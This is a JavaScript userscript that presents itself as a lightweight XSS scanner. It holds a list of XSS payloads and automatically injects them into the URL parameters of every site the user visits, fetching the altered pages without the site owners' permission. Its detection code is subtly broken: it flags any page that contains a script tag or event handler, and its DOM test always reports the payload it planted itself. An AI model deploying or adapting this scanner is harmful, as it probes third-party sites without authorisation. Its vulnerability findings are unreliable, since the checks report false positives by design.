// ==UserScript==
// @name         Lightweight XSS Hunter
// @namespace    https://github.com/xsshunter
// @version      2.1
// @description  Non-blocking XSS scanner with minimal performance impact
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Lightweight configuration
    const CONFIG = {
        scanDelay: 5000,           // Wait 5 seconds after page load
        maxRequests: 2,            // Maximum concurrent requests
        requestDelay: 1000,        // Delay between requests
        timeout: 5000,             // Request timeout
        debug: false,
        skipDomains: ['google.com', 'github.com', 'stackoverflow.com', 'youtube.com'],
        alertStyle: 'console'
    };

    // Minimal, effective payloads
    const PAYLOADS = [
        '"><script>alert("XSS")</script>',
        '\';alert("XSS");//',
        '"><svg/onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<img src=x onerror=alert("XSS")>'
    ];

    // Simple unique marker
    const MARKER = 'xss' + Date.now();
    const foundVulns = new Set();
    let isScanning = false;

    // Utility functions
    const log = (msg, isVuln = false) => {
        if (CONFIG.debug || isVuln) {
            console.log(`[XSS Hunter] ${isVuln ? '🚨 ' : ''}${msg}`);
        }
    };

    const shouldSkip = () => {
        const host = location.hostname.toLowerCase();
        return CONFIG.skipDomains.some(domain => host.includes(domain));
    };

    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    // Lightweight reflected XSS test
    async function testReflected() {
        if (isScanning) return;
        isScanning = true;

        try {
            const url = new URL(location.href);
            const params = Array.from(url.searchParams.keys()).slice(0, 3); // Limit to 3 params
            
            if (params.length === 0) {
                log('No parameters to test');
                return;
            }

            log(`Testing ${params.length} parameters`);

            for (const param of params) {
                for (let i = 0; i < Math.min(2, PAYLOADS.length); i++) { // Test max 2 payloads per param
                    const payload = PAYLOADS[i] + MARKER;
                    const testUrl = new URL(url);
                    testUrl.searchParams.set(param, payload);

                    try {
                        const controller = new AbortController();
                        setTimeout(() => controller.abort(), CONFIG.timeout);

                        const response = await fetch(testUrl.toString(), {
                            method: 'GET',
                            signal: controller.signal,
                            headers: { 'X-Requested-With': 'XMLHttpRequest' }
                        });

                        if (response.ok) {
                            const html = await response.text();
                            if (html.includes(MARKER) && isVulnerable(html, payload)) {
                                const vulnId = `${param}_${i}`;
                                if (!foundVulns.has(vulnId)) {
                                    foundVulns.add(vulnId);
                                    notifyVuln(`Reflected XSS in parameter '${param}'`);
                                }
                            }
                        }
                    } catch (e) {
                        if (e.name !== 'AbortError') {
                            log(`Request error: ${e.message}`);
                        }
                    }

                    await sleep(CONFIG.requestDelay); // Non-blocking delay
                }
            }
        } finally {
            isScanning = false;
        }
    }

    // Simple vulnerability validation
    function isVulnerable(html, payload) {
        const dangerous = [
            /<script[^>]*>/i,
            /on\w+\s*=\s*[^>]*>/i,
            /javascript:/i,
            /<svg[^>]*onload/i,
            /<img[^>]*onerror/i
        ];
        return dangerous.some(regex => regex.test(html));
    }

    // Lightweight DOM XSS test
    function testDOM() {
        try {
            // Test only if safe to do so
            if (document.body && document.readyState === 'complete') {
                const testPayload = `<img src=x onerror=console.log("${MARKER}")>`;
                const div = document.createElement('div');
                div.style.display = 'none';
                div.innerHTML = testPayload;
                
                // Check if dangerous elements were created
                if (div.querySelector('img[onerror], script, svg[onload]')) {
                    notifyVuln('Potential DOM XSS via innerHTML');
                }
                
                // Safe cleanup
                div.innerHTML = '';
            }
        } catch (e) {
            log(`DOM test error: ${e.message}`);
        }
    }

    // Check URL hash for XSS
    function testHash() {
        if (location.hash) {
            const hash = decodeURIComponent(location.hash);
            const dangerous = ['<script', 'javascript:', 'onerror=', 'onload='];
            
            if (dangerous.some(pattern => hash.toLowerCase().includes(pattern))) {
                notifyVuln('Potential XSS in URL hash: ' + hash.substring(0, 50));
            }
        }
    }

    // Notification function
    function notifyVuln(message) {
        log(message, true);
        if (CONFIG.alertStyle === 'alert') {
            // Use setTimeout to avoid blocking
            setTimeout(() => alert(`XSS Vulnerability: ${message}`), 100);
        }
    }

    // Main scan function - non-blocking
    function runScan() {
        if (shouldSkip()) {
            log('Skipping scan on safe domain');
            return;
        }

        log('Starting lightweight XSS scan...');

        // Use requestIdleCallback if available, otherwise setTimeout
        const scheduleWork = window.requestIdleCallback || 
            ((fn) => setTimeout(fn, CONFIG.scanDelay));

        scheduleWork(() => {
            try {
                // Quick hash check
                testHash();
                
                // DOM test (very lightweight)
                testDOM();
                
                // Reflected XSS test (rate limited)
                testReflected().then(() => {
                    log(`Scan completed. Found ${foundVulns.size} potential vulnerabilities.`);
                }).catch(e => {
                    log(`Scan error: ${e.message}`);
                });
                
            } catch (e) {
                log(`Scan initialization error: ${e.message}`);
            }
        });
    }

    // Initialize scanner
    function initScanner() {
        // Multiple initialization methods to ensure it runs
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', runScan, { once: true });
        } else if (document.readyState === 'interactive') {
            // Page is still loading but DOM is ready
            setTimeout(runScan, 1000);
        } else {
            // Page is fully loaded
            setTimeout(runScan, CONFIG.scanDelay);
        }
    }

    // Lightweight URL change detection for SPAs
    let currentUrl = location.href;
    function checkUrlChange() {
        if (location.href !== currentUrl) {
            currentUrl = location.href;
            foundVulns.clear(); // Reset findings for new page
            setTimeout(runScan, 2000); // Delayed scan for new page
        }
    }

    // Monitor URL changes with minimal impact
    setInterval(checkUrlChange, 3000);

    // Start the scanner
    initScanner();

})();